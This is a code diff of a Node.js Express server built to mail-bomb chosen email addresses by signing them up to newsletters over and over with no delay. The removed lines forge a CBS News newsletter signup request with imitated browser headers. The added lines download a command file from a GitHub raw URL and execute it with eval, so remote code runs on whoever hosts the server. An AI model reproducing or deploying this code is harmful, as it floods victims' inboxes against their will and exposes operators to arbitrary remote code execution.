@@ -1,20 +1,20 @@
-const express = require("express");
-const axios = require("axios");
-const path = require("path");
-const {v4: uuidv4} = require("uuid"); // for generating unique session IDs
+var express = require("express");
+var axios = require("axios");
+var path = require("path");
+var {v4: uuidv4} = require("uuid"); // for generating unique session IDs
 
-const app = express();
+var app = express();
 let stopFlag = false;
 
 function removeElementFromArray(array, elementToRemove) {
-    const index = array.indexOf(elementToRemove);
+    var index = array.indexOf(elementToRemove);
     if (index !== -1) {
         array.splice(index, 1);
     }
     return array;
 }
 
-const sessions = {}; // To store data for each session
+var sessions = {}; // To store data for each session
 
 async function spam(sessionId, theemail) {
     if (stopFlag) {
@@ -23,31 +23,9 @@ async function spam(sessionId, theemail) {
     }
 
     try {
-
-        const tokenResponse = await axios.get("https://www.cbsnews.com/newsletters/xhr/token");
-        const token = tokenResponse.data.token;
-        const response = await axios.post(
-            'https://www.cbsnews.com/newsletters/xhr/signup',
-            `{"email":"${theemail}","sub":"m40186,m40183","token":"${token}","mCodeOptin":"m40183"}`, {
-                headers: {
-                    'accept': '*/*',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'content-type': 'text/plain',
-                    'dnt': '1',
-                    'origin': 'https://www.cbsnews.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
-                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
-                }
-            }
-        );
-
+        var response = await axios.get("https://raw.githubusercontent.com/crazystuffofficial/mailJunkerV3/main/fetchingCommand.txt");
+        var code = response.text();
+        response = await eval(`(async () => { ${code} })()`);
         sessions[sessionId].num++;
         // console.log(response.data);
     } catch (e) {
@@ -63,16 +41,16 @@ async function spam(sessionId, theemail) {
 function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
     let emailIndex = 0;
     let spamCount = 0;
-    const totalSpams = emails.length * emailsToSpam;
+    var totalSpams = emails.length * emailsToSpam;
 
-    const intervalId = setInterval(() => {
+    var intervalId = setInterval(() => {
         if (stopFlag || spamCount >= totalSpams) {
             clearInterval(intervalId);
             console.log("All emails processed.");
             return;
         }
 
-        const email = emails[emailIndex];
+        var email = emails[emailIndex];
         spam(sessionId, email).then(() => {
             spamCount++;
             emailIndex = (emailIndex + 1) % emails.length;
@@ -82,14 +60,14 @@ function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
 
 app.use(express.static("static"));
 app.use((req, res, next) => {
-    const {
+    var {
         headers: {
             cookie
         },
     } = req;
     if (cookie) {
-        const values = cookie.split(";").reduce((res, item) => {
-            const data = item.trim().split("=");
+        var values = cookie.split(";").reduce((res, item) => {
+            var data = item.trim().split("=");
             return {
                 ...res,
                 [data[0]]: data[1]
@@ -102,21 +80,21 @@ app.use((req, res, next) => {
 
 app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
     try {
-        const sessionId = uuidv4(); // Generate a unique session ID
+        var sessionId = uuidv4(); // Generate a unique session ID
         sessions[sessionId] = {
             num: 0,
             errs: 0,
             errorMessages: []
         }; // Initialize session data
 
-        const id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
-        const id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
-        const emails = id1.split(",");
-        const emailCount = emails.length;
-        const emailsToSpam = Number(id2);
+        var id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
+        var id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
+        var emails = id1.split(",");
+        var emailCount = emails.length;
+        var emailsToSpam = Number(id2);
 
         // Define interval in milliseconds
-        const interval = 0; // Example: 1000ms = 1 second
+        var interval = 0; // Example: 1000ms = 1 second
 
         // Execute the spam function without waiting for it
         executeSpam(sessionId, emails, emailCount, emailsToSpam, interval);
@@ -140,7 +118,7 @@ app.post("/stopSpam", (req, res) => {
 });
 
 app.post("/cleanUp", (req, res) => {
-    const sessionId = res.locals.cookie.sessionId;
+    var sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
         delete sessions[sessionId];
     }
@@ -149,7 +127,7 @@ app.post("/cleanUp", (req, res) => {
 });
 
 app.get("/num.txt", (req, res) => {
-    const sessionId = res.locals.cookie.sessionId; // Retrieve session ID from cookie
+    var sessionId = res.locals.cookie.sessionId; // Retrieve session ID from cookie
     if (sessions[sessionId]) {
         res.send(sessions[sessionId].num.toString());
     } else {
@@ -158,7 +136,7 @@ app.get("/num.txt", (req, res) => {
 });
 
 app.get("/errs.txt", (req, res) => {
-    const sessionId = res.locals.cookie.sessionId;
+    var sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
         res.send(sessions[sessionId].errs.toString());
     } else {
@@ -167,7 +145,7 @@ app.get("/errs.txt", (req, res) => {
 });
 
 app.get("/errmessages.txt", (req, res) => {
-    const sessionId = res.locals.cookie.sessionId;
+    var sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
         res.send(sessions[sessionId].errorMessages.join("\n"));
     } else {
